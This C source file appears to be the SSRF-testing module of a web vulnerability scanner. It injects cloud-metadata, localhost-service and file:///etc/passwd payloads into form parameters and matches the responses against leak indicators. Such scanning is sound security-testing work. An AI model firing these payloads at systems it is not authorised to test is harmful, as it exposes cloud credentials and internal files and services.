#include "scanxss.h"

/*
 * SSRF module — Server-Side Request Forgery
 *
 * Strategy A — Internal address injection:
 *   Inject common internal/cloud metadata URLs and look for
 *   distinctive content in the response body (cloud metadata,
 *   internal service banners, etc.)
 *
 * Strategy B — Callback endpoint (if configured):
 *   Inject the configured --endpoint URL into parameters.
 *   If the target fetches it, the endpoint will record a hit.
 *   We poll for a "SSRF_TOKEN" marker in the response.
 */

/* ── Internal-address payloads ── */
static const char *ssrf_internal[] = {
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",                          /* AWS/GCP/Azure metadata */
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",                           /* Redis */
    "http://127.0.0.1:9200/",                           /* Elasticsearch */
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",                      /* Memcached */
    NULL
};

/* ── Indicators that SSRF worked ── */
static const char *ssrf_indicators[] = {
    "ami-id",           /* AWS EC2 metadata */
    "instance-id",
    "local-ipv4",
    "computeMetadata",  /* GCP */
    "MSI_ENDPOINT",     /* Azure */
    "root:x:0:0:",      /* /etc/passwd via file:// */
    "REDIS",
    "elasticsearch",
    "+PONG",
    NULL
};

/* ── Parameters that are typically SSRF vectors ── */
static const char *ssrf_param_hints[] = {
    "url", "uri", "src", "source", "href", "link",
    "redirect", "location", "target", "dest", "destination",
    "path", "file", "load", "fetch", "host", "site",
    "endpoint", "callback", "proxy", "remote",
    NULL
};

static bool param_is_ssrf_candidate(const char *name) {
    for (int i = 0; ssrf_param_hints[i]; i++)
        if (str_contains_icase(name, ssrf_param_hints[i]))
            return true;
    return false;
}

static int test_ssrf(ScanContext *ctx, const Form *form,
                     int fidx, const char *payload) {
    const ScanConfig *cfg = &ctx->config;

    Param params[MAX_HEADERS];
    memcpy(params, form->fields, sizeof(Param) * form->field_count);
    strncpy(params[fidx].value, payload, MAX_PARAM_LEN-1);

    HttpResponse *resp = NULL;
    if (form->method == METHOD_POST) {
        resp = http_post(cfg, form->url, params, form->field_count);
    } else {
        char url[MAX_URL_LEN * 2] = {0};
        strncpy(url, form->url, MAX_URL_LEN-1);
        strncat(url, "?", sizeof(url)-strlen(url)-1);
        for (int i = 0; i < form->field_count; i++) {
            if (i) strncat(url, "&", sizeof(url)-strlen(url)-1);
            strncat(url, params[i].name,  sizeof(url)-strlen(url)-1);
            strncat(url, "=",             sizeof(url)-strlen(url)-1);
            char *enc = url_encode(params[i].value);
            strncat(url, enc, sizeof(url)-strlen(url)-1);
            free(enc);
        }
        resp = http_get(cfg, url);
    }

    rate_wait(&ctx->rate);
    ctx->requests_made++;
    if (!resp) return 0;

    int found = 0;
    if (resp->body) {
        for (int k = 0; ssrf_indicators[k]; k++) {
            if (str_contains_icase(resp->body, ssrf_indicators[k])) {
                Vuln v = {0};
                v.type     = VULN_SSRF;
                v.severity = 5;
                v.found_at = time(NULL);
                strncpy(v.url,       form->url,                  MAX_URL_LEN-1);
                strncpy(v.parameter, form->fields[fidx].name,    MAX_PARAM_LEN-1);
                strncpy(v.payload,   payload,                    MAX_PARAM_LEN-1);
                snprintf(v.evidence, sizeof(v.evidence),
                         "Internal response indicator: %s", ssrf_indicators[k]);
                strncpy(v.module, "ssrf", sizeof(v.module)-1);
                attack_add_vuln(ctx, &v);
                log_vuln(cfg->color,
                         "SSRF found! URL=%s PARAM=%s PAYLOAD=%s",
                         form->url, form->fields[fidx].name, payload);
                found = 1;
                break;
            }
        }
    }
    http_response_free(resp);
    return found;
}

int module_ssrf_run(ScanContext *ctx, const Form *form) {
    const ScanConfig *cfg = &ctx->config;
    log_info(cfg->verbose, cfg->color, "SSRF testing: %s", form->url);

    int found = 0;

    for (int f = 0; f < form->field_count; f++) {
        /* test all params OR only hinted ones depending on verbosity */
        if (!cfg->verbose && !param_is_ssrf_candidate(form->fields[f].name))
            continue;

        /* Strategy A: internal addresses */
        for (int p = 0; ssrf_internal[p]; p++)
            found += test_ssrf(ctx, form, f, ssrf_internal[p]);

        /* Strategy B: callback endpoint */
        if (cfg->endpoint[0]) {
            char cb[MAX_URL_LEN];
            /* embed a unique token so we can correlate */
            snprintf(cb, sizeof(cb), "%s?ssrf_token=%lx_%s",
                     cfg->endpoint,
                     (unsigned long)time(NULL),
                     form->fields[f].name);
            found += test_ssrf(ctx, form, f, cb);
        }
    }
    return found;
}
